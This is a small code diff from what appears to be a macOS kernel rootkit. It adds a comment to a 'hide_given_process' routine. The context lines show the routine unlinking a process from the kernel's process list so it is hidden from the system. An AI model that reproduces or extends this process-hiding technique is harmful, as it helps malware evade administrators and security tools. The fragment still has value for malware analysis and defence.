@@ -47,6 +47,10 @@ errno_t hide_given_process(troy_hide_object *process_hide)
             LOG(LOG_INFO, "Get process name scuuessfully");
             LIST_REMOVE(kernel_proc, p_list);
         }
+        /*
+         * here we must use le_prev, because le_next is NULL.
+         * and current kernproc's name is kernel_task
+         */
         kernel_proc = (struct proc_yousemite*)kernel_proc->p_list.le_prev;
     }while(kernel_proc);
 
